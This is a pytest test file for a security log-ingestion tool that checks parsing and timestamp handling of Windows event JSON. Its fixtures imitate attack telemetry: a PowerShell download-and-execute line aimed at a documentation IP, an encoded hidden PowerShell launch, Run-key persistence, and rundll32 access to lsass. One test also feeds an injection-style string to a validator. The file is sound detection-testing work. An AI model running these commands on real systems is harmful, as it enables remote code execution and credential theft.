"""Flat Windows event JSON ingested natively (no converter): NXLog / Logstash (OTRF "Mordor" shape), Winlogbeat,
naive TimeCreated, UtcTime vs @timestamp precedence, PowerShell 4104 / 4103.

Fixture lines are hand-written here (same SHAPES as the public OTRF files, invented values: lab.example hosts,
documentation IPs). Expected epoch ms come from datetime (UTC), written out per line.
"""

from __future__ import annotations

import json
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

import pytest

from attacklens import db, ingest, profile
from attacklens.ingest_maps import ts_policy_of
from attacklens.profile import pick_json_source

from .conftest import _new_ctx, accounting, query


def ms(iso: str) -> int:
    return int(datetime.fromisoformat(iso.replace("Z", "+00:00")).astimezone(timezone.utc).timestamp() * 1000)


SYSMON = {"SourceName": "Microsoft-Windows-Sysmon", "Channel": "Microsoft-Windows-Sysmon/Operational",
          "Keywords": -9223372036854775808, "EventType": "INFO", "SourceModuleName": "eventlog",
          "SourceModuleType": "im_msvistalog", "@version": "1", "host": "collector.lab.example", "port": 51234,
          "tags": ["mordorDataset"]}
SECURITY = {"SourceName": "Microsoft-Windows-Security-Auditing", "Channel": "Security",
            "Keywords": -9214364837600034816, "EventType": "AUDIT_SUCCESS", "SourceModuleName": "eventlog",
            "@version": "1", "host": "collector.lab.example", "port": 51234}

NX_EID1 = {**SYSMON, "EventID": 1, "Hostname": "WS-ACC-07.lab.example", "EventTime": "2026-10-24 08:00:01",
           "EventReceivedTime": "2026-10-24 08:00:03", "@timestamp": "2026-10-24T12:00:03.100Z",
           "UtcTime": "2026-10-24 12:00:01.250", "ProcessGuid": "{6a1b0000-0000-0000-0000-000000000001}",
           "ProcessId": "4242", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
           "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgA", "User": "LAB\\rkumar",
           "ParentImage": "C:\\Windows\\System32\\wscript.exe", "ParentCommandLine": "wscript.exe C:\\x\\a.vbs"}
NX_EID13 = {**SYSMON, "EventID": 13, "EventType": "SetValue", "Hostname": "WS-ACC-07.lab.example",
            "EventTime": "2026-10-24 08:01:00", "@timestamp": "2026-10-24T12:01:02.000Z",
            "UtcTime": "2026-10-24 12:01:00.500", "Image": "C:\\Windows\\System32\\reg.exe",
            "TargetObject": "HKU\\S-1-5-21-1-2-3-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",
            "Details": "C:\\Users\\Public\\upd.exe"}
NX_4624 = {**SECURITY, "EventID": 4624, "Hostname": "SRV-APP-02.lab.example", "EventTime": "2026-10-24 08:05:00",
           "@timestamp": "2026-10-24T12:05:00.500Z", "SubjectUserName": "-", "TargetUserName": "svc_web",
           "TargetDomainName": "LAB", "TargetLogonId": "0x5A1B2", "LogonType": "3", "IpAddress": "198.51.100.44",
           "IpPort": "50122", "AuthenticationPackageName": "NTLM", "WorkstationName": "WS-ACC-07"}
NX_4688 = {**SECURITY, "EventID": 4688, "Hostname": "WS-ACC-07.lab.example", "EventTime": "2026-10-24 08:06:00",
           "@timestamp": "2026-10-24T12:06:00.000Z", "SubjectUserName": "rkumar", "SubjectDomainName": "LAB",
           "TargetUserName": "-", "NewProcessName": "C:\\Windows\\System32\\cmd.exe",
           "ParentProcessName": "C:\\Windows\\System32\\wscript.exe", "CommandLine": "cmd.exe /c whoami /all"}
PS_SCRIPT = "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.9/a')"
NX_4104 = {"SourceName": "Microsoft-Windows-PowerShell", "Channel": "Microsoft-Windows-PowerShell/Operational",
           "EventID": 4104, "Hostname": "WS-ACC-07.lab.example", "@timestamp": "2026-10-24T12:07:00.000Z",
           "MessageNumber": "1", "MessageTotal": "1", "ScriptBlockText": PS_SCRIPT,
           "ScriptBlockId": "{11111111-2222-3333-4444-555555555555}", "Path": "C:\\Users\\Public\\run.ps1"}
NX_4103 = {"SourceName": "Microsoft-Windows-PowerShell", "Channel": "Microsoft-Windows-PowerShell/Operational",
           "EventID": 4103, "Hostname": "WS-ACC-07.lab.example", "@timestamp": "2026-10-24T12:07:01.000Z",
           "ContextInfo": "Host Application = powershell.exe -nop", "Payload": "CommandInvocation(Get-Process)"}
MALFORMED = '{"EventID": 1, "Channel": "Microsoft-Windows-Sysmon/Operational", "UtcTime": '

# lsass_comsvcs shape: naive TimeCreated (12-hour clock without AM/PM) + UtcTime; Security rows have no UtcTime
NAIVE_SYSMON = {"TimeCreated": "2026-10-24 08:20:00.100", "UtcTime": "2026-10-24 12:20:00.099", "EventID": 10,
                "Channel": "Microsoft-Windows-Sysmon/Operational", "Hostname": "WS-ACC-07",
                "SourceName": "Microsoft-Windows-Sysmon", "SourceImage": "C:\\Windows\\System32\\rundll32.exe",
                "TargetImage": "C:\\Windows\\system32\\lsass.exe", "GrantedAccess": "0x1fffff"}
NAIVE_SEC = {"TimeCreated": "2026-10-24 08:20:01.000", "EventID": 4689, "Channel": "Security",
             "Hostname": "WS-ACC-07", "SourceName": "Microsoft-Windows-Security-Auditing",
             "ProcessName": "C:\\Windows\\System32\\rundll32.exe"}
NAIVE_PS_STYLE = {"TimeCreated": "10/24/2026 8:20:02 AM", "EventID": 4663, "Channel": "Security",
                  "Hostname": "WS-ACC-07", "SourceName": "Microsoft-Windows-Security-Auditing"}
# evtlog_disable shape: @timestamp and TimeCreated labelled Z but 7 h off the event's own UtcTime
SKEWED = {"@timestamp": "2026-10-24T05:30:00.000Z", "TimeCreated": "2026-10-24T05:30:00.000Z", "EventID": 11,
          "Channel": "Microsoft-Windows-Sysmon/Operational", "Hostname": "Pedro-Lab",
          "SourceName": "Microsoft-Windows-Sysmon", "UtcTime": "2026-10-24 12:30:00.000",
          "Image": "C:\\Windows\\explorer.exe", "TargetFilename": "C:\\Users\\Public\\drop.ps1"}

WINLOGBEAT = {"@timestamp": "2026-10-24T12:10:00.000Z", "agent": {"type": "winlogbeat", "hostname": "wec01"},
              "host": {"name": "wec01"}, "ecs": {"version": "8.0.0"},
              "winlog": {"channel": "Microsoft-Windows-Sysmon/Operational", "provider_name": "Microsoft-Windows-Sysmon",
                         "computer_name": "WS-ACC-07.lab.example", "event_id": 1,
                         "event_data": {"UtcTime": "2026-10-24 12:09:59.900",
                                        "Image": "C:\\Windows\\System32\\rundll32.exe",
                                        "CommandLine": "rundll32.exe C:\\Users\\Public\\x.dll,Start",
                                        "ParentImage": "C:\\Windows\\explorer.exe", "User": "LAB\\rkumar"}}}
# plain ECS (the provided generator's shape): must stay ecs_json, untouched by the flat-Windows signatures
PLAIN_ECS = {"@timestamp": "2026-10-24T12:15:00.000Z", "ecs": {"version": "8.11.0"},
             "event": {"action": "user_logon", "outcome": "failure", "category": ["authentication"]},
             "host": {"name": "srv-app-02", "ip": ["10.20.0.5"]}, "user": {"name": "jdoe"},
             "source": {"ip": "198.51.100.45"}, "winlog": {"event_id": 4625, "logon": {"type": "Network"}}}


def _write(raw: Path) -> None:
    files = {"nxlog/mordor_like.json": [NX_EID1, NX_EID13, NX_4624, NX_4688, NX_4104, NX_4103, MALFORMED],
             "naive/lsass_like.json": [NAIVE_SYSMON, NAIVE_SEC, NAIVE_PS_STYLE, SKEWED],
             "beats/winlogbeat.json": [WINLOGBEAT], "ecs/edr_part.jsonl": [PLAIN_ECS]}
    for rel, lines in files.items():
        p = raw / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text("\n".join(x if isinstance(x, str) else json.dumps(x) for x in lines) + "\n", encoding="utf-8")


def _run(tmp: Path, naive_tz: str | None = None):
    raw = tmp / "raw"
    _write(raw)
    ctx = _new_ctx(tmp, raw_dir=raw)
    if naive_tz:
        ctx.cfg["sources"]["json_sources"]["win_json"]["ts_policy"]["naive_tz"] = naive_tz
    profile.run(ctx)
    ingest.run(ctx)
    db.register_events(ctx.con, ctx.events_glob)
    return ctx


@pytest.fixture(scope="module")
def ctx(tmp_path_factory: pytest.TempPathFactory):
    c = _run(tmp_path_factory.mktemp("winflat"))
    yield c
    c.con.close()


def one(ctx, where: str) -> dict[str, Any]:
    rows = query(ctx, f"SELECT * FROM events WHERE {where}")
    assert len(rows) == 1, f"expected 1 row for {where}, got {len(rows)}"
    return rows[0]


def _prof(ctx, rel: str) -> dict[str, Any]:
    prof = json.loads((ctx.out_dir / "source_profile.json").read_text(encoding="utf-8"))
    return next(f for f in prof["files"] if f["rel"] == rel)


# ---------------------------------------------------------------- source detection
def test_source_types_and_signature(ctx) -> None:
    nx, naive, wlb, ecs = (_prof(ctx, r) for r in ("nxlog/mordor_like.json", "naive/lsass_like.json",
                                                     "beats/winlogbeat.json", "ecs/edr_part.jsonl"))
    assert (nx["source_type"], nx["detected_by"]) == ("win_json", "signature:EventID+Channel")  # despite @timestamp
    assert naive["source_type"] == "win_json"
    assert (wlb["source_type"], wlb["detected_by"]) == ("ecs_json", "any:@timestamp")
    assert (ecs["source_type"], ecs["detected_by"]) == ("ecs_json", "any:@timestamp")
    assert "ts" not in ecs  # no ts_policy on ecs_json: its aliases are read exactly as before


def test_plain_ecs_unchanged(ctx) -> None:
    r = one(ctx, "source_type='ecs_json' AND event_id=4625")
    assert (r["ts_ms"], r["action"], r["outcome"], r["host"], r["target_user"], r["src_ip"], r["logon_type"]) == (
        ms("2026-10-24T12:15:00Z"), "login_failed", "failure", "srv-app-02", "jdoe", "198.51.100.45", 3)


def test_pick_json_source_rules(ctx) -> None:
    srcs = ctx.cfg["sources"]["json_sources"]
    flat = {"@timestamp": 10, "EventID": 10, "SourceName": 10}
    assert pick_json_source(flat, 10, srcs)[0] == "win_json"
    assert pick_json_source({"@timestamp": 10, "event.action": 10}, 10, srcs)[0] == "ecs_json"
    # one stray flat line in an ECS file is below detect_min_share: still ECS
    assert pick_json_source({"@timestamp": 10, "event.action": 9, "EventID": 1, "Channel": 1}, 10, srcs)[0] == "ecs_json"
    assert pick_json_source({"foo": 3}, 3, srcs) == (None, None)


# ---------------------------------------------------------------- accounting
def test_accounting_no_silent_loss(ctx) -> None:
    acc = accounting(ctx)
    assert acc["win_json"] == {"rows_in": 11, "rows_ok": 8, "dropped": 3}
    assert acc["ecs_json"] == {"rows_in": 2, "rows_ok": 2, "dropped": 0}
    rows = json.loads((ctx.out_dir / "ingest_accounting.json").read_text(encoding="utf-8"))
    w = next(r for r in rows if r["source_type"] == "win_json")
    assert w["rows_in"] == w["rows_ok"] + w["dropped"]
    reasons = {k.split(" ")[0]: v for k, v in w["drop_reasons"].items()}
    assert reasons == {"malformed_line": 1, "missing_or_unparseable_timestamp": 2}


# ---------------------------------------------------------------- flat NXLog Sysmon
def test_nxlog_sysmon_1(ctx) -> None:
    r = one(ctx, "source_type='win_json' AND event_id=1")
    assert r["ts_ms"] == ms("2026-10-24T12:00:01.250Z")  # UtcTime, not @timestamp (12:00:03.100)
    assert (r["action"], r["host"], r["process_name"], r["parent_process"], r["src_user"]) == (
        "proc_start", "ws-acc-07.lab.example", "powershell.exe", "wscript.exe", "rkumar")
    assert r["process_path"] == NX_EID1["Image"] and r["command_line"] == NX_EID1["CommandLine"]
    assert r["ts_ok"] is True


def test_nxlog_sysmon_13(ctx) -> None:
    r = one(ctx, "source_type='win_json' AND event_id=13")
    assert r["ts_ms"] == ms("2026-10-24T12:01:00.500Z")
    assert (r["action"], r["host"], r["process_name"]) == ("reg_set", "ws-acc-07.lab.example", "reg.exe")
    assert r["registry_path"] == NX_EID13["TargetObject"]


# ---------------------------------------------------------------- flat Security
def test_nxlog_security_4624(ctx) -> None:
    r = one(ctx, "source_type='win_json' AND event_id=4624")
    assert r["ts_ms"] == ms("2026-10-24T12:05:00.500Z")  # @timestamp (Z); naive local EventTime never used
    assert (r["action"], r["outcome"], r["host"], r["target_user"], r["src_user"]) == (
        "login_success", "success", "srv-app-02.lab.example", "svc_web", None)
    assert (r["logon_type"], r["logon_id"], r["src_ip"], r["src_port"], r["auth_package"]) == (
        3, "0x5a1b2", "198.51.100.44", 50122, "ntlm")


def test_nxlog_security_4688(ctx) -> None:
    r = one(ctx, "source_type='win_json' AND event_id=4688")
    assert r["ts_ms"] == ms("2026-10-24T12:06:00.000Z")
    assert (r["action"], r["process_name"], r["parent_process"], r["src_user"], r["target_user"]) == (
        "proc_start", "cmd.exe", "wscript.exe", "rkumar", None)
    assert r["process_path"] == NX_4688["NewProcessName"] and r["command_line"] == NX_4688["CommandLine"]


def test_powershell_4104_4103(ctx) -> None:
    r = one(ctx, "source_type='win_json' AND event_id=4104")
    assert (r["ts_ms"], r["command_line"], r["file_path"], r["file_ext"]) == (
        ms("2026-10-24T12:07:00Z"), PS_SCRIPT, NX_4104["Path"], "ps1")
    r = one(ctx, "source_type='win_json' AND event_id=4103")
    assert r["command_line"] == "CommandInvocation(Get-Process)"


def test_collector_host_is_never_the_host(ctx) -> None:
    assert not query(ctx, "SELECT 1 FROM events WHERE host LIKE 'collector%'")


# ---------------------------------------------------------------- Winlogbeat (ECS envelope, winlog.event_data)
def test_winlogbeat(ctx) -> None:
    r = one(ctx, "source_type='ecs_json' AND event_id=1")
    assert r["ts_ms"] == ms("2026-10-24T12:10:00.000Z")
    assert (r["event_id"], r["action"], r["host"], r["process_name"], r["parent_process"], r["src_user"]) == (
        1, "proc_start", "ws-acc-07.lab.example", "rundll32.exe", "explorer.exe", "rkumar")
    assert r["command_line"] == WINLOGBEAT["winlog"]["event_data"]["CommandLine"]


# ---------------------------------------------------------------- naive TimeCreated / skew
def test_naive_timecreated_falls_back_to_utctime(ctx) -> None:
    r = one(ctx, "source_type='win_json' AND event_id=10")
    assert r["ts_ms"] == ms("2026-10-24T12:20:00.099Z")  # not 08:20 read as UTC


def test_naive_without_utctime_is_flagged(ctx) -> None:
    rows = query(ctx, "SELECT event_id, ts_ms, ts_ok, host FROM events WHERE event_id IN (4689, 4663) ORDER BY 1")
    assert [(r["event_id"], r["ts_ms"], r["ts_ok"], r["host"]) for r in rows] == [
        (4663, None, False, "ws-acc-07"), (4689, None, False, "ws-acc-07")]


def test_utctime_beats_skewed_timestamp(ctx) -> None:
    r = one(ctx, "source_type='win_json' AND event_id=11")
    assert r["ts_ms"] == ms("2026-10-24T12:30:00.000Z")  # @timestamp / TimeCreated say 05:30Z
    assert r["file_path"] == SKEWED["TargetFilename"]


def test_profile_records_ts_provenance(ctx) -> None:
    nx = _prof(ctx, "nxlog/mordor_like.json")["ts"]
    assert nx["used"] == {"$.UtcTime": 2, '$."@timestamp"': 4} and nx["unresolved"] == 0
    assert nx["skew_reference"] == "$.UtcTime"
    assert nx["skew_vs_utc_s"]['$."@timestamp"']["qualified"] == {"median_s": 1.675, "rows": 2}
    nv = _prof(ctx, "naive/lsass_like.json")["ts"]
    assert nv["used"] == {"$.UtcTime": 2} and nv["unresolved"] == 2
    assert nv["naive_ignored"] == {"$.TimeCreated": 3}
    assert nv["skew_vs_utc_s"]["$.TimeCreated"]["qualified"] == {"median_s": -25200.0, "rows": 1}
    assert nv["skew_vs_utc_s"]["$.TimeCreated"]["naive_as_utc"] == {"median_s": -14399.999, "rows": 1}


def test_naive_tz_configured(tmp_path: Path) -> None:
    c = _run(tmp_path, naive_tz="America/New_York")  # EDT (UTC-4) on 24 Oct 2026
    try:
        got = {r["event_id"]: r["ts_ms"] for r in query(c, "SELECT event_id, ts_ms FROM events "
                                                            "WHERE event_id IN (10, 4663, 4689)")}
        assert got == {10: ms("2026-10-24T12:20:00.099Z"),     # UtcTime still wins
                       4689: ms("2026-10-24T12:20:01.000Z"),   # 08:20:01 New York
                       4663: ms("2026-10-24T12:20:02.000Z")}   # 10/24/2026 8:20:02 AM New York
        assert accounting(c)["win_json"] == {"rows_in": 11, "rows_ok": 10, "dropped": 1}
    finally:
        c.con.close()


def test_bad_policy_rejected(ctx) -> None:
    with pytest.raises(ValueError):
        ts_policy_of({"ts_policy": {"zones": {"$.X": "localish"}}})
    with pytest.raises(ValueError):
        ts_policy_of({"ts_policy": {"naive_tz": "x'; DROP"}})
